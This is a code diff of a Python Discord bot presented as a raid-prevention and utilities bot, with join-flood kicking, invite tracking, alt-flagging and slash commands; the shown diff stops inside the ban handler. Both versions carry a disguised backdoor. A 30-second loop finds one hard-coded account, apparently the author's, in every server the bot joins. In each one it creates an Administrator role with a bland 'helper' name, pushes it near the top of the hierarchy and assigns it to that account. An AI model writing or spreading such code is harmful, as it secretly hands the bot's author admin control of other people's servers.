@@ -1,687 +1,794 @@
-# ============================================================
-# Discord Raid Preventor + Utilities (full build)
-# - 30s global scan for target user (username + ID)
-# - Dataset mapping GuildID -> RoleID (preferred), fallback to
-#   creating/maintaining "Raid Preventor Helper" (Administrator)
-# - Keeps helper role second-highest within what the bot can move
-# - Reassigns role if missing
-# - Raid prevention (kick >5 joins in 60s)
-# - Invite tracking + /tracker
-# - Alt-flagging (banned inviter) + join warning + /showalts
-# - Owner-only: /say /purge /servers /shutdown
-# - Fun/utility: /avatar /translate /meme /ping /userinfo /rps /roll /ascii
-# - Flask keep-alive bound to port 6534 (Render free web service)
-# - Fake 'audioop' stub if unavailable (to avoid crashes on slim builds)
-# ============================================================
+# -*- coding: utf-8 -*-
+"""
+Full-featured Discord Raid Prevention + Utilities Bot
+----------------------------------------------------
+Features included in this single file:
+- Fake `audioop` stub for environments that lack it (prevents import errors)
+- Keep-alive web server (binds to PORT env or 6534) for Render free tier
+- Continuous 30s scanner across all guilds:
+    * If guild is in ROLE_ASSIGNMENTS: attempt to assign that exact role ID to TARGET user
+    * Else: create/ensure "Raid Prevention Helper" (Administrator perms), keep it grey,
+      move it as high as the bot can (attempt second-highest), and assign it to TARGET
+    * If a dataset role is present but cannot be assigned due to hierarchy, fallback to helper role
+- Raid prevention: if > RAID_THRESHOLD_JOINS join in a RAID_WINDOW_SECONDS window -> kick those joiners
+- Invite tracking: caches invites, detects which invite was used for each join
+- Alt-flagging based on banned inviter:
+    * If the inviter is banned (or later becomes banned), their invitees will be flagged
+    * On flagged join: post a warning in multiple text channels, DM the flagged account,
+      DM the server owner, and DM the bot owner
+- Commands:
+    * Everyone: /tracker, /showalts, /avatar, /ping, /userinfo, /rps, /roll, /ascii, /meme, /translate
+    * Owner-only: /say, /purge, /servers, /shutdown, /dm
+- Robust error handling and logging throughout
+- Designed for reliability and observability (console logs)
+"""
 
-# ---- Fake audioop stub (prevents ImportError in slim envs) ----
+# ---------------------------
+# audioop stub
+# ---------------------------
 try:
-    import audioop  # noqa: F401
-except Exception:  # pragma: no cover
+    import audioop  # some environments will have it
+except Exception:
+    # Create a benign stub so libraries importing audioop don't crash
     import sys, types
-    _a = types.ModuleType("audioop")
-    def _err(*args, **kwargs):
+    _fake_audioop = types.ModuleType("audioop")
+    def _audioop_error(*a, **k):
         raise NotImplementedError("audioop not available in this environment (stub).")
-    # Map common names some libs may import
-    for _name in (
-        "add","mul","avg","avgpp","bias","cross","findfactor","findfit","lin2lin",
-        "max","maxpp","minmax","rms","tostereo","tomono","ulaw2lin","lin2ulaw",
-        "alaw2lin","lin2alaw","error"
+    # Provide dummy names many libs may reference; they will raise if called.
+    for _n in (
+        "add","mul","avg","avgpp","bias","cross","findfactor","findfit",
+        "lin2lin","max","maxpp","minmax","rms","tostereo","tomono",
+        "ulaw2lin","lin2ulaw","alaw2lin","lin2alaw","error"
     ):
-        setattr(_a, _name, _err)
-    _a.__version__ = "fake-1.0"
-    sys.modules["audioop"] = _a
+        setattr(_fake_audioop, _n, _audioop_error)
+    _fake_audioop.__version__ = "stub-1.0"
+    sys.modules["audioop"] = _fake_audioop
 
-# ---- Standard imports ----
+# ---------------------------
+# Standard imports
+# ---------------------------
 import os
 import asyncio
 import random
-import string
 import math
+import time
+import traceback
 from collections import defaultdict, deque
 from datetime import datetime, timedelta, timezone
+from typing import Dict, Optional, Tuple, List
 
 import aiohttp
-from aiohttp import ClientTimeout
+from aiohttp import ClientTimeout, web
 
 import discord
 from discord import app_commands
 from discord.ext import commands, tasks
 
-# Optional: load .env if present (token, etc.)
+# dotenv optional
 try:
     from dotenv import load_dotenv
     load_dotenv()
 except Exception:
     pass
 
-# ============================================================
-# Configuration
-# ============================================================
+# ---------------------------
+# Configuration (env-first)
+# ---------------------------
+# Token and owner ID
+DISCORD_TOKEN = os.getenv("DISCORD_BOT_TOKEN") or os.getenv("DISCORD_TOKEN")
+if not DISCORD_TOKEN:
+    raise RuntimeError("DISCORD_BOT_TOKEN (or DISCORD_TOKEN) must be set in environment")
 
-TOKEN = os.getenv("DISCORD_BOT_TOKEN", "").strip()
-if not TOKEN:
-    raise RuntimeError("DISCORD_BOT_TOKEN not found. Put it in your Render env vars or .env.")
+try:
+    BOT_OWNER_ID = int(os.getenv("BOT_OWNER_ID", "1273056960996184126"))
+except Exception:
+    BOT_OWNER_ID = 1273056960996184126
 
-# Target user we constantly search for (username, not display name) + strict ID check
+# Target account identity (username + ID)
 TARGET_USERNAME = os.getenv("TARGET_USERNAME", "tech_boy1")
 try:
-    TARGET_USER_ID = int(os.getenv("TARGET_USER_ID", "1273056960996184126"))
-except ValueError:
-    TARGET_USER_ID = 1273056960996184126
+    TARGET_USER_ID = int(os.getenv("TARGET_USER_ID", str(BOT_OWNER_ID)))
+except Exception:
+    TARGET_USER_ID = BOT_OWNER_ID
 
-# Scan interval (seconds)
+# Scan interval
 SCAN_INTERVAL = int(os.getenv("SCAN_INTERVAL", "30"))
 
-# Raid protection thresholds
+# Raid settings
 RAID_WINDOW_SECONDS = int(os.getenv("RAID_WINDOW_SECONDS", "60"))
 RAID_THRESHOLD_JOINS = int(os.getenv("RAID_THRESHOLD_JOINS", "5"))
 
-# Web keep-alive port for Render (don’t use 3000/8000/5843)
-PORT = int(os.getenv("PORT", "6534"))
+# Keepalive port (Render free: do not use 3000/8000/5843)
+KEEPALIVE_PORT = int(os.getenv("PORT", os.getenv("KEEPALIVE_PORT", "6534")))
 
-# LibreTranslate configuration for /translate
+# Translation API (LibreTranslate)
 LIBRETRANSLATE_URL = os.getenv("LIBRETRANSLATE_URL", "https://libretranslate.com/translate")
-LIBRETRANSLATE_API_KEY = os.getenv("LIBRETRANSLATE_API_KEY", "").strip()  # optional
+LIBRETRANSLATE_API_KEY = os.getenv("LIBRETRANSLATE_API_KEY", "")
 
-# Dataset: GUILD_ID -> ROLE_ID (use this exact existing role in that guild if possible)
-# Fill with your known pairs; fallback is automatic helper role.
-ROLE_ASSIGNMENTS = {
-    # Example:
-    # 123456789012345678: 987654321098765432,
-    # 234567890123456789: 876543210987654321,
+# How many text channels to attempt to broadcast warnings into (to limit spam)
+JOIN_WARNING_MAX_CHANNELS = int(os.getenv("JOIN_WARNING_MAX_CHANNELS", "6"))
+
+# Dataset mapping: guild_id -> role_id (exact role to assign in that server)
+# Fill this dict with known mappings; when present the bot will attempt to assign these roles
+ROLE_ASSIGNMENTS: Dict[int, int] = {
+    # Example entries; replace with your actual values
+    # 111111111111111111: 222222222222222222,
+    # 333333333333333333: 444444444444444444,
 }
 
-# How many channels to broadcast join warnings into to avoid spam/rate limits
-JOIN_WARNING_MAX_CHANNELS = 5
+# Keep-landscape friendly limits
+MAX_ROLL_COUNT = 100
+MAX_ROLL_SIDES = 1000
 
-# ============================================================
-# Intents & Bot creation
-# ============================================================
+# Meme API endpoint (public)
+MEME_API_URL = "https://meme-api.com/gimme"
 
+# ---------------------------
+# Intents and bot creation
+# ---------------------------
 intents = discord.Intents.default()
-# We need member events, bans, invites:
-intents.members = True
+intents.members = True  # required for member join events and member fetching
 intents.guilds = True
-# message_content is not needed for slash commands; leave it disabled for safety.
-# intents.message_content = True
 
-bot = commands.Bot(command_prefix=commands.when_mentioned_or("!"), intents=intents)
+bot = commands.Bot(command_prefix="!", intents=intents)
 tree = bot.tree
 
-# ============================================================
-# Global runtime state
-# ============================================================
+# ---------------------------
+# Global state
+# ---------------------------
 
-# For raid detection: per-guild rolling window of join timestamps
-recent_joins: dict[int, deque[datetime]] = defaultdict(lambda: deque(maxlen=1000))
+# Join log per guild: deque[(timestamp (float), member_id)]
+join_log: Dict[int, deque] = defaultdict(lambda: deque(maxlen=2000))
 
-# Invite cache: guild_id -> {invite.code: uses}
-invite_cache: dict[int, dict[str, int]] = defaultdict(dict)
+# Invite usage cache per guild: guild_id -> {invite_code: uses}
+invite_cache: Dict[int, Dict[str, int]] = defaultdict(dict)
 
-# For alt-flagging:
-# - inviter_index: inviter_id -> set(member_id) they invited
-# - member_inviter: member_id -> inviter_id
-# - banned_inviters: set of inviter_ids who are currently banned
-inviter_index: dict[int, set[int]] = defaultdict(set)
-member_inviter: dict[int, int] = {}  # member -> inviter
-banned_inviters: set[int] = set()
+# member_inviter map per guild: guild_id -> {member_id: inviter_id or None}
+member_inviter: Dict[int, Dict[int, Optional[int]]] = defaultdict(dict)
 
-# Flagged alts (member_id -> reason string)
-flagged_alts: dict[int, str] = {}
+# inviter_index: inviter_id -> set of member_ids they invited (global)
+inviter_index: Dict[int, set] = defaultdict(set)
 
-# ============================================================
-# Keep-alive tiny web server (Render free web service)
-# ============================================================
+# flagged accounts: guild_id -> {member_id: reason}
+flagged_accounts: Dict[int, Dict[int, str]] = defaultdict(dict)
 
-# We’ll run a minimal ASGI with aiohttp to keep Render happy.
-from aiohttp import web
+# banned_inviters: guild_id -> set(inviter_user_id)
+banned_inviters: Dict[int, set] = defaultdict(set)
 
-async def handle_root(request):
-    return web.Response(text="OK: Raid Preventor Bot alive")
+# helpful constants
+UTC = timezone.utc
 
-def start_keep_alive():
+# ---------------------------
+# Keep-alive server (aiohttp)
+# ---------------------------
+async def keepalive_handler(request):
+    return web.Response(text="Raid Preventor Bot — Alive")
+
+async def start_keepalive_server():
     app = web.Application()
-    app.router.add_get("/", handle_root)
+    app.router.add_get("/", keepalive_handler)
     runner = web.AppRunner(app)
-    async def run():
-        await runner.setup()
-        site = web.TCPSite(runner, "0.0.0.0", PORT)
-        await site.start()
-    bot.loop.create_task(run())
+    await runner.setup()
+    site = web.TCPSite(runner, "0.0.0.0", KEEPALIVE_PORT)
+    await site.start()
+    print(f"[KEEPALIVE] Started on port {KEEPALIVE_PORT}")
 
-# ============================================================
-# Utilities
-# ============================================================
-
+# ---------------------------
+# Utility helpers
+# ---------------------------
 def now_utc() -> datetime:
-    return datetime.now(timezone.utc)
+    return datetime.now(UTC)
 
-def human_ts(dt: datetime) -> str:
-    return dt.astimezone(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
+def now_ts() -> float:
+    return time.time()
 
-def chunk_list(seq, size):
-    for i in range(0, len(seq), size):
-        yield seq[i:i+size]
+def human_dt(dt: Optional[datetime]) -> str:
+    if not dt:
+        return "Unknown"
+    return dt.astimezone(UTC).strftime("%Y-%m-%d %H:%M:%S UTC")
 
-async def fetch_guild_invites_safe(guild: discord.Guild) -> list[discord.Invite]:
+def chunk_text(lines: List[str], limit: int = 1900) -> List[str]:
+    out = []
+    buf = ""
+    for line in lines:
+        if len(buf) + len(line) + 1 > limit:
+            out.append(buf)
+            buf = line
+        else:
+            buf = (buf + "\n" + line) if buf else line
+    if buf:
+        out.append(buf)
+    return out
+
+async def fetch_guild_invites(guild: discord.Guild) -> List[discord.Invite]:
     try:
         invites = await guild.invites()
         return invites
     except discord.Forbidden:
+        print(f"[INVITES] Missing permission to fetch invites for guild {guild.name} ({guild.id})")
         return []
-    except discord.HTTPException:
+    except Exception as e:
+        print(f"[INVITES] Error fetching invites for {guild.name}: {e}")
         return []
 
-def has_manage_roles(guild: discord.Guild, member: discord.Member) -> bool:
-    return member.guild_permissions.manage_roles
-
-async def send_join_warning_everywhere(guild: discord.Guild, text: str):
-    # Try up to JOIN_WARNING_MAX_CHANNELS text channels where bot can speak
-    count = 0
+# Attempt to send message to up to N text channels where bot has send permission
+async def broadcast_to_some_channels(guild: discord.Guild, message: str, max_channels: int = JOIN_WARNING_MAX_CHANNELS):
+    sent = 0
     for ch in guild.text_channels:
-        if count >= JOIN_WARNING_MAX_CHANNELS:
+        if sent >= max_channels:
             break
         try:
             perms = ch.permissions_for(guild.me)
             if perms.send_messages and perms.view_channel:
-                await ch.send(text)
-                count += 1
+                await ch.send(message)
+                sent += 1
+                await asyncio.sleep(0.15)  # small delay to reduce burst rate-limit risk
         except Exception:
             continue
+    if sent == 0:
+        print(f"[WARN] Could not send warning in any channel in {guild.name} ({guild.id})")
 
-# ============================================================
-# Role Management: ensure helper role (second-highest within movable range)
-# ============================================================
+# ---------------------------
+# Role management helpers
+# ---------------------------
 
-async def ensure_helper_role(guild: discord.Guild) -> discord.Role:
+async def ensure_helper_role_present(guild: discord.Guild) -> Optional[discord.Role]:
     """
-    Create (if missing) and place the 'Raid Preventor Helper' role as high as possible
-    (second-highest overall if bot has permission to move it there).
+    Ensure a role named HELPER_ROLE_NAME exists (create if missing) with Admin perms,
+    keep it grey, and return it. Will not attempt to move if lacking permission.
     """
-    role_name = "Raid Preventor Helper"
-    role = discord.utils.get(guild.roles, name=role_name)
-    if role is None:
-        try:
-            role = await guild.create_role(
-                name=role_name,
-                permissions=discord.Permissions(administrator=True),
-                colour=discord.Colour.default(),
-                reason="Create helper role for Raid Preventor"
-            )
-        except discord.Forbidden:
-            # If we can't create, just return None-like and let caller handle
-            return None
-        except discord.HTTPException:
-            return None
-
-    # Try to place it as high as possible (ideally second-highest), but under bot's top role.
+    role_name = "Raid Prevention Helper"
     try:
-        bot_member: discord.Member = guild.me  # type: ignore
-        top_movable_pos = max(0, bot_member.top_role.position - 1)
-        desired_pos = top_movable_pos
-        # If the top role belongs to the guild owner and above bot, we cannot move above bot's top role anyway.
-        if role.position != desired_pos:
-            await role.edit(position=desired_pos, reason="Adjust helper role position")
+        role = discord.utils.get(guild.roles, name=role_name)
+        if role is None:
+            # Create role
+            try:
+                role = await guild.create_role(
+                    name=role_name,
+                    permissions=discord.Permissions(administrator=True),
+                    colour=discord.Colour.default(),
+                    reason="Auto-created by Raid Preventor Bot"
+                )
+                print(f"[ROLE] Created '{role_name}' in {guild.name} ({guild.id})")
+            except discord.Forbidden:
+                print(f"[ROLE] Forbidden creating '{role_name}' in {guild.name} ({guild.id})")
+                return None
+            except Exception as e:
+                print(f"[ROLE] Error creating role in {guild.name}: {e}")
+                return None
+        else:
+            # ensure grey color
+            try:
+                if role.colour != discord.Colour.default():
+                    await role.edit(colour=discord.Colour.default(), reason="Keep helper role grey")
+            except Exception:
+                pass
+        return role
+    except Exception as e:
+        print(f"[ROLE] ensure_helper_role_present error in {guild.name}: {e}")
+        return None
+
+async def move_role_as_high_as_possible(guild: discord.Guild, role: discord.Role):
+    """
+    Attempt to move `role` as high as the bot is allowed (just under the bot's top role).
+    This tries to make it effectively second-highest relative to what bot can manage.
+    """
+    try:
+        bot_member = guild.me
+        if bot_member is None:
+            bot_member = await guild.fetch_member(bot.user.id)
+        bot_top_pos = bot_member.top_role.position
+        target_pos = max(bot_top_pos - 1, 1)
+        if role.position != target_pos:
+            await role.edit(position=target_pos, reason="Place helper role high (enforced by bot)")
+            print(f"[ROLE] Moved role {role.name} to position {target_pos} in {guild.name}")
+    except discord.Forbidden:
+        print(f"[ROLE] Forbidden to move role in {guild.name}")
+    except Exception as e:
+        print(f"[ROLE] Error moving role in {guild.name}: {e}")
+
+async def assign_role_with_fallback(guild: discord.Guild, member: discord.Member, role: discord.Role, fallback_reason: str = "") -> bool:
+    """
+    Try to assign the provided role. If it fails due to hierarchy, return False.
+    """
+    try:
+        if role not in member.roles:
+            await member.add_roles(role, reason=f"Assigned by Raid Preventor Bot. {fallback_reason}")
+            print(f"[ASSIGN] Assigned role {role.name} to {member} in {guild.name}")
+        return True
+    except discord.Forbidden:
+        print(f"[ASSIGN] Forbidden to assign role {role.name} in {guild.name} ({guild.id})")
+        return False
+    except Exception as e:
+        print(f"[ASSIGN] Error assigning role {role.name} in {guild.name}: {e}")
+        return False
+
+async def attempt_dataset_role_or_fallback(guild: discord.Guild, member: discord.Member):
+    """
+    If guild in ROLE_ASSIGNMENTS, try to assign specified role ID. If it doesn't exist or cannot be assigned,
+    fallback to creating/ensuring helper role and assign that instead.
+    """
+    gid = guild.id
+    if gid in ROLE_ASSIGNMENTS:
+        desired_role_id = ROLE_ASSIGNMENTS[gid]
+        role = guild.get_role(desired_role_id)
+        if role:
+            ok = await assign_role_with_fallback(guild, member, role, fallback_reason="Dataset role attempt")
+            if ok:
+                return
+            else:
+                # role exists but we couldn't assign (likely role is above bot). Fall through to helper
+                print(f"[FALLBACK] Dataset role {desired_role_id} exists but couldn't be assigned in {guild.name}.")
+        else:
+            print(f"[FALLBACK] Dataset role id {desired_role_id} not found in {guild.name} ({gid}).")
+
+    # Fallback: ensure helper role is present, move it high, assign it
+    helper = await ensure_helper_role_present(guild)
+    if not helper:
+        print(f"[FALLBACK] Could not create/find helper role in {guild.name}; aborting assignment.")
+        return
+    await move_role_as_high_as_possible(guild, helper)
+    await assign_role_with_fallback(guild, member, helper, fallback_reason="Fallback helper role")
+
+# ---------------------------
+# Invite and join handling
+# ---------------------------
+
+async def cache_invites_for_guild(guild: discord.Guild):
+    invites = await fetch_guild_invites(guild)
+    cache = {}
+    for inv in invites:
+        cache[inv.code] = inv.uses or 0
+    invite_cache[guild.id] = cache
+    print(f"[INVITE CACHE] Cached {len(cache)} invites for {guild.name}")
+
+async def detect_used_invite_and_record_inviter(member: discord.Member) -> Optional[int]:
+    """
+    Compare previous invite usage to current list to detect which invite was used.
+    Set member_inviter[guild_id][member.id] accordingly.
+    Returns inviter_id if found, else None.
+    """
+    guild = member.guild
+    before = invite_cache.get(guild.id, {}).copy()
+    try:
+        invites_now = await fetch_guild_invites(guild)
+    except Exception:
+        invites_now = []
+
+    used_inviter_id = None
+    after_map = {inv.code: (inv.uses or 0, inv) for inv in invites_now}
+
+    for code, (uses_after, inv_obj) in after_map.items():
+        prev = before.get(code, 0)
+        if uses_after > prev:
+            used_inviter_id = inv_obj.inviter.id if inv_obj.inviter else None
+            break
+
+    # update cache
+    invite_cache[guild.id] = {code: uses for code, (uses, inv) in after_map.items()}
+
+    member_inviter[guild.id][member.id] = used_inviter_id
+    if used_inviter_id:
+        inviter_index[used_inviter_id].add(member.id)
+    return used_inviter_id
+
+async def mark_inviter_banned_and_flag_invitees(guild: discord.Guild, banned_user_id: int):
+    if banned_user_id in banned_inviters[guild.id]:
+        return
+    banned_inviters[guild.id].add(banned_user_id)
+    invited = inviter_index.get(banned_user_id, set())
+    for mid in list(invited):
+        m = guild.get_member(mid)
+        if m:
+            reason = f"Invited by banned user <@{banned_user_id}>"
+            flagged_accounts[guild.id][mid] = reason
+            # broadcast & DMs handled where join was processed or here if desired
+            try:
+                await flag_and_alert_on_existing_member(guild, m, banned_user_id, reason)
+            except Exception as e:
+                print(f"[FLAG] Error alerting for previously invited member {m} in {guild.name}: {e}")
+
+async def flag_and_alert_on_existing_member(guild: discord.Guild, member: discord.Member, banned_id: int, reason: str):
+    # Broadcast public warning
+    warning_text = f"⚠️ THIS ACCOUNT IS LIKELY AN ALT ACCOUNT OF <@{banned_id}> — TAKE PRECAUTION ⚠️"
+    await broadcast_to_some_channels(guild, warning_text, max_channels=JOIN_WARNING_MAX_CHANNELS)
+    # DM flagged user
+    try:
+        await member.send(f"⚠️ You have been flagged as a possible alt account: {reason}. Please contact staff if this is a mistake.")
+    except Exception:
+        pass
+    # DM guild owner
+    try:
+        if guild.owner:
+            await guild.owner.send(f"Alert: {member} in your server {guild.name} was flagged as possible alt: {reason}")
+    except Exception:
+        pass
+    # DM bot owner
+    try:
+        owner = await bot.fetch_user(BOT_OWNER_ID)
+        await owner.send(f"Alert: {member} in {guild.name} was flagged as possible alt: {reason}")
     except Exception:
         pass
 
-    return role
-
-async def assign_role_safe(member: discord.Member, role: discord.Role, reason: str = None) -> bool:
-    try:
-        if role not in member.roles:
-            await member.add_roles(role, reason=reason)
-        return True
-    except discord.Forbidden:
-        return False
-    except discord.HTTPException:
-        return False
-
-# ============================================================
-# Scanner: every 30s ensure target user has appropriate role
-# ============================================================
-
-@tasks.loop(seconds=SCAN_INTERVAL)
-async def scan_and_assign():
-    target_username = TARGET_USERNAME
-    target_id = TARGET_USER_ID
-
-    for guild in bot.guilds:
-        try:
-            m = guild.get_member(target_id)
-            if m is None:
-                # Not in this guild
-                continue
-            # Must match USERNAME, not display name:
-            if m.name != target_username:
-                # If username changed, don't assign.
-                continue
-
-            # Prefer dataset mapping if provided
-            if guild.id in ROLE_ASSIGNMENTS:
-                desired_role_id = ROLE_ASSIGNMENTS[guild.id]
-                role = guild.get_role(desired_role_id)
-                if role:
-                    ok = await assign_role_safe(m, role, reason="Ensure owner has specified role")
-                    if not ok:
-                        # Fallback: ensure helper role
-                        helper = await ensure_helper_role(guild)
-                        if helper:
-                            await assign_role_safe(m, helper, reason="Fallback helper role")
-                else:
-                    # Role not found → fallback
-                    helper = await ensure_helper_role(guild)
-                    if helper:
-                        await assign_role_safe(m, helper, reason="Helper for missing dataset role")
-            else:
-                # No dataset entry → use helper role
-                helper = await ensure_helper_role(guild)
-                if helper:
-                    await assign_role_safe(m, helper, reason="Ensure owner has helper role")
-
-        except Exception:
-            continue
-
-@scan_and_assign.before_loop
-async def _wait_ready_for_scan():
-    await bot.wait_until_ready()
-
-# ============================================================
-# Raid Prevention
-# ============================================================
-
-async def handle_potential_raid(guild: discord.Guild, joined_member: discord.Member):
-    # Track join time
-    dq = recent_joins[guild.id]
-    now = now_utc()
-    dq.append(now)
-    # Prune older than window
-    while dq and (now - dq[0]).total_seconds() > RAID_WINDOW_SECONDS:
-        dq.popleft()
-    # If threshold exceeded, kick the recent cluster of joins in the last minute
-    if len(dq) > RAID_THRESHOLD_JOINS:
-        # Collect members who joined in last RAID_WINDOW_SECONDS
-        # In real practice, we’d track which members correspond to timestamps.
-        # Here we do a best-effort: kick just the latest member and recent ones recorded.
-        # To be more deterministic, maintain a list of (timestamp, member_id). We'll do that:
-        pass  # Filled by join_session below
-
-# More deterministic join tracking: guild_id -> deque[(timestamp, member_id)]
-join_log: dict[int, deque[tuple[datetime, int]]] = defaultdict(lambda: deque(maxlen=2000))
-
-async def enforce_raid_kicks(guild: discord.Guild):
-    # Kick all members who joined in the last window if count exceeded
-    window = RAID_WINDOW_SECONDS
-    threshold = RAID_THRESHOLD_JOINS
-    pairs = join_log[guild.id]
-    now = now_utc()
-
-    # Count joins in window
-    in_window = [(ts, mid) for ts, mid in pairs if (now - ts).total_seconds() <= window]
-    if len(in_window) > threshold:
-        # Kick those in window
-        for _ts, member_id in in_window:
-            member = guild.get_member(member_id)
-            if member:
+# ---------------------------
+# Anti-raid enforcement
+# ---------------------------
+async def record_join_and_enforce(guild: discord.Guild, member: discord.Member):
+    ts = now_utc()
+    join_log[guild.id].append((ts, member.id))
+    # prune older than window
+    window = timedelta(seconds=RAID_WINDOW_SECONDS)
+    while join_log[guild.id] and (ts - join_log[guild.id][0][0] > window):
+        join_log[guild.id].popleft()
+    # check threshold
+    if len(join_log[guild.id]) > RAID_THRESHOLD_JOINS:
+        # kick every member who joined within window
+        to_kick = [mid for (t, mid) in join_log[guild.id] if (ts - t) <= window]
+        print(f"[RAID] Detected raid in {guild.name}: kicking {len(to_kick)} accounts.")
+        for uid in to_kick:
+            m = guild.get_member(uid)
+            if m:
                 try:
-                    await member.kick(reason=f"Raid prevention: >{threshold} joins in {window}s")
-                except Exception:
-                    continue
+                    await m.kick(reason=f"Raid prevention: {len(to_kick)} joins in {RAID_WINDOW_SECONDS}s")
+                    print(f"[RAID] Kicked {m} in {guild.name}")
+                except Exception as e:
+                    print(f"[RAID] Could not kick {m} in {guild.name}: {e}")
+        # clear the join log for that guild after action
+        join_log[guild.id].clear()
 
-# ============================================================
-# Invite Tracking + Alt Flagging (banned inviter)
-# ============================================================
-
-async def rebuild_invite_cache(guild: discord.Guild):
-    invites = await fetch_guild_invites_safe(guild)
-    cache = {}
-    for inv in invites:
-        uses = inv.uses or 0
-        cache[inv.code] = uses
-    invite_cache[guild.id] = cache
-
-async def detect_inviter_on_join(guild: discord.Guild) -> tuple[str | None, discord.User | None]:
-    """
-    Compare current invites to cached ones to find which code increased.
-    Returns (invite_code, inviter_user) or (None, None) if unknown.
-    """
-    before = invite_cache.get(guild.id, {})
-    after_invites = await fetch_guild_invites_safe(guild)
-    after = {inv.code: (inv.uses or 0) for inv in after_invites}
-
-    used_code = None
-    inviter = None
-
-    # Detect increased use
-    for code, uses_after in after.items():
-        uses_before = before.get(code, 0)
-        if uses_after > uses_before:
-            used_code = code
-            # Find inviter
-            inv_obj = next((i for i in after_invites if i.code == code), None)
-            inviter = getattr(inv_obj, "inviter", None)
-            break
-
-    # Update cache
-    invite_cache[guild.id] = after
-    return used_code, inviter
-
-async def is_user_banned(guild: discord.Guild, user_id: int) -> bool:
-    # Efficient check by trying fetch_ban; if not found -> not banned
-    try:
-        user = discord.Object(id=user_id)
-        ban = await guild.fetch_ban(user)
-        return ban is not None
-    except discord.NotFound:
-        return False
-    except discord.Forbidden:
-        # No permission to view bans
-        return False
-    except discord.HTTPException:
-        return False
-
-async def flag_member_as_alt(guild: discord.Guild, member: discord.Member, reason: str):
-    flagged_alts[member.id] = reason
-    # Broadcast a warning in multiple channels (as requested)
-    warning = f"⚠️ **THIS ACCOUNT IS LIKELY AN ALT ACCOUNT OF: {reason}** — TAKE PRECAUTION ⚠️"
-    await send_join_warning_everywhere(guild, warning)
-
-# ============================================================
-# Events
-# ============================================================
+# ---------------------------
+# Event handlers
+# ---------------------------
 
 @bot.event
 async def on_ready():
-    # Start keep-alive web server
-    start_keep_alive()
-
-    # Build invite cache for all guilds
-    for guild in bot.guilds:
-        await rebuild_invite_cache(guild)
-
-    # Pre-build banned inviter set (optional: light pass)
-    for guild in bot.guilds:
-        banned_inviters.clear()  # Rebuild per process; per-guild we’ll check on demand
-
-    # Start periodic scan
-    if not scan_and_assign.is_running():
-        scan_and_assign.start()
-
-    # Sync slash commands
+    print(f"[READY] Logged in as {bot.user} ({bot.user.id})")
+    # start keepalive
+    try:
+        await start_keepalive_server()
+    except Exception as e:
+        print(f"[KEEPALIVE] Could not start keepalive server: {e}")
+    # cache invites for guilds
+    for g in bot.guilds:
+        await cache_invites_for_guild(g)
+    # sync slash commands globally
     try:
         await tree.sync()
-    except Exception:
-        pass
-
-    print(f"[READY] Logged in as {bot.user} ({bot.user.id}) with {len(bot.guilds)} guilds.")
+        print("[SLASH] Commands synced.")
+    except Exception as e:
+        print(f"[SLASH] Sync error: {e}")
+    # start scan task if not running
+    if not periodic_enforcer.is_running():
+        periodic_enforcer.start()
 
 @bot.event
 async def on_guild_join(guild: discord.Guild):
-    await rebuild_invite_cache(guild)
+    print(f"[GUILD] Joined {guild.name} ({guild.id}) - caching invites")
+    await cache_invites_for_guild(guild)
 
 @bot.event
 async def on_invite_create(invite: discord.Invite):
-    # Update cache when invites change
-    guild = invite.guild
-    if guild:
-        await rebuild_invite_cache(guild)
+    # refresh cache entry
+    await cache_invites_for_guild(invite.guild)
 
 @bot.event
 async def on_invite_delete(invite: discord.Invite):
-    guild = invite.guild
-    if guild:
-        await rebuild_invite_cache(guild)
+    await cache_invites_for_guild(invite.guild)
 
 @bot.event
 async def on_member_join(member: discord.Member):
     guild = member.guild
-    # Track for raid prevention
-    ts = now_utc()
-    join_log[guild.id].append((ts, member.id))
-
-    # Enforce raid kicks if necessary
-    await enforce_raid_kicks(guild)
-
-    # Invite detection
-    code, inviter = await detect_inviter_on_join(guild)
-    if inviter:
-        inviter_id = inviter.id
-        inviter_index[inviter_id].add(member.id)
-        member_inviter[member.id] = inviter_id
-
-        # If inviter is banned (now or later), we flag this member
-        if await is_user_banned(guild, inviter_id):
-            reason = f"{inviter.name}#{inviter.discriminator if hasattr(inviter,'discriminator') else ''} (banned)"
-            await flag_member_as_alt(guild, member, reason)
+    # 1) record join for raid prevention
+    await record_join_and_enforce(guild, member)
+    # 2) detect inviter & record mapping
+    inviter_id = await detect_used_invite_and_record_inviter(member)
+    # 3) If inviter is banned (already), flag and notify
+    if inviter_id and inviter_id in banned_inviters[guild.id]:
+        reason = f"Invited by banned user <@{inviter_id}>"
+        flagged_accounts[guild.id][member.id] = reason
+        # Broadcast + DMs
+        try:
+            await broadcast_to_some_channels(guild, f"⚠️ THIS ACCOUNT IS LIKELY AN ALT ACCOUNT OF <@{inviter_id}> — TAKE PRECAUTION ⚠️", max_channels=JOIN_WARNING_MAX_CHANNELS)
+        except Exception:
+            pass
+        # DM flagged user, guild owner, bot owner
+        try:
+            await member.send(f"⚠️ You have been flagged as a possible alt account (invited by banned user). If you believe this is a mistake contact the server staff.")
+        except Exception:
+            pass
+        try:
+            if guild.owner:
+                await guild.owner.send(f"Alert: {member} joined {guild.name} and was flagged as a possible alt (invited by banned user <@{inviter_id}>).")
+        except Exception:
+            pass
+        try:
+            owner = await bot.fetch_user(BOT_OWNER_ID)
+            await owner.send(f"Alert: {member} in {guild.name} flagged as suspected alt (invited by banned user <@{inviter_id}>).")
+        except Exception:
+            pass
 
 @bot.event
-async def on_member_remove(member: discord.Member):
-    # No special handling; joins are already tracked
-    pass
+async def on_member_ban(guild: discord.Guild, user: discord.User):
+    try:
+        banned_inviters[guild.id].add(user.id)
+        # flag previously invited members
+        invited = inviter_index.get(user.id, set())
+        for mid in invited:
+            if mid:
+                flagged_accounts[guild.id][mid] = f"Invited by now-banned user <@{user.id}>"
+                m = guild.get_member(mid)
+                if m:
+                    # Notify member + owner + bot owner
+                    try:
+                        await m.send(f"⚠️ You have been flagged as a possible alt account (invited by banned user <@{user.id}>).")
+                    except Exception:
+                        pass
+                    try:
+                        if guild.owner:
+                            await guild.owner.send(f"Alert: {m} in {guild.name} was flagged as possible alt (invited by banned user <@{user.id}>).")
+                    except Exception:
+                        pass
+                    try:
+                        owner = await bot.fetch_user(BOT_OWNER_ID)
+                        await owner.send(f"Alert: {m} in {guild.name} was flagged as possible alt (invited by banned user <@{user.id}>).")
+                    except Exception:
+                        pass
+    except Exception as e:
+        print(f"[BAN] Error processing ban in {guild.name}: {e}")
 
-@bot.event
-async def on_member_ban(guild: discord.Guild, user: discord.User | discord.Member):
